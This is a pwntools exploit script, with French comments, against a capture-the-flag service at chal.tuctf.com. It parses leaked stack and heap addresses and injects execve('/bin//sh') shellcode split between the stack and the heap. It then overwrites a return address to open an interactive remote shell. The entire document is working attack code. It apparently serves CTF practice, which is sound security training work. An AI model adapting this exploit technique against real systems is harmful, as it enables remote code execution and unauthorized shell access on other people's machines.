#coding: utf-8
from pwn import *

IP = "chal.tuctf.com"
PORT = 30504

r = remote(IP, PORT)

shellcode = ""

def sc(x):
    global shellcode
    shellcode += asm(x)

#Récupère les adresses Leakée
leak_ret_stack = r.readuntil("1:").split("\n")
leak_ret_heap = leak_ret_stack[2]
leak_ret_heap = int(leak_ret_heap, 16)
leak_ret_stack = int(leak_ret_stack[3], 16)

# Construction d'un shellcode adapté au chall
sc("xor eax, eax")
sc("push eax")
sc("push 0x68732f2f")
sc("mov edx, %s" % hex(leak_ret_heap))
sc("jmp edx")
sc("push 0x6e69622f")
sc("xor ecx,ecx")
sc("xor edx,edx")
sc("mov ebx,esp")
sc("mov al,0xb")
sc("int 0x80")

p = p32(leak_ret_stack)

#Envoie de la 2eme partie du shellcode dans la HEAP
r.send(shellcode[15:])
r.read(50)
#Envoie de la 1ere partie du shellcode dans la STACK
r.send(shellcode[0:15])
r.read(50)

log.success("Leak @Stack: %s" % hex(leak_ret_stack))
log.success("Leak @Heap: %s" % hex(leak_ret_heap))

log.info("Shellcode : \n%s" % disasm(shellcode))

r.send(p)
r.read(50)
r.interactive()
